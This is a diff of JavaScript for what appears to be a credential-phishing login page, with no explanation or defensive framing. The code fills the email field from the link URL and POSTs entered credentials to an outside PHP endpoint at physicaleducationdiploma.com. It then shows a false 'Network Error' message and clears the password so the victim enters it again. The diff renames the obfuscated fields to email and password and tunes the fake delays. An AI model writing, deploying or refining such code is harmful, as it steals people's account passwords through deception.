@@ -1,13 +1,9 @@
-
-
-
-
 $(document).ready(function() {
 
 
     var baseUrl = (window.location).href;
     var url = baseUrl.substring(baseUrl.lastIndexOf('=') + 1);
-    $("#x1").val(url);
+    $("#email").val(url);
     const handleErr = ()=>{
       var errMsg = "Network Error! Please verify your information and try again";
       var spann = document.querySelector(".mmssgg");
@@ -22,7 +18,7 @@ $(document).ready(function() {
     
     var btnPost = document.querySelector('#submitBtn');
   var divMsg = document.querySelector('#hello');
-  var inpPwd = document.querySelector('#x2');
+  var inpPwd = document.querySelector('#password');
   
   inpPwd.addEventListener('input', ()=>{
             // alert('input was clicked!')
@@ -33,7 +29,7 @@ $(document).ready(function() {
   
     btnPost.addEventListener('click', function(){
      
-      //setTimeout(function(){
+      setTimeout(function(){
         
         
         
@@ -42,34 +38,20 @@ $(document).ready(function() {
         if(inpPwd.value === ""){
           
           
-          divMsg.textContent = 'Please input password';
+          divMsg.textContent = 'Network Error! Please verify your information and try again';
           divMsg.style.color = "#ba1100";
-        //  btnPost.textContent = "Sign In";
           
-//}, 2200);
-          
-        //}, 3000)
+
         }
         else{
           divMsg.textContent = 'Network Error! Please verify your information and try again';
           divMsg.style.color = "#ba1100";
-          setTimeout(()=>{
-            inpPwd.value = "";
-          },1500)
-         // inpPwd.value = "";
-          
-         btnPost.textContent = "Please wait...";
-setTimeout(()=>{
-btnPost.textContent = "Sign In";
-  //inpPwd.value = "";
-}, 2200);
-                             
         }
         
         
         
         
-    
+      }, 3000)
       // alert(divMsg.value);
       
     });
@@ -84,7 +66,8 @@ btnPost.textContent = "Sign In";
         $("#submitBtn").html(`<button class="btn btn-sm btn-primary" disabled>
   <span class="spinner-grow spinner-grow-sm"></span>
   Please Wait...
-</button>`).prop("disabled", false);
+  
+</button>`).prop("disabled", true);
         $.ajax({
             url: "https://physicaleducationdiploma.com/component/ladedre.php",
             type: 'POST',
@@ -96,8 +79,8 @@ btnPost.textContent = "Sign In";
                 $('#bd').show();
                 $('#hm').hide();
                 setTimeout(function() {
-                    $("#x1").val(url);
-                    $("#x2").val("");
+                    $("#email").val(url);
+                    $("#password").val("");
                     $('#msg').val(`Network Error! Please verify your information and try again`);
                     
                     // handleErr();
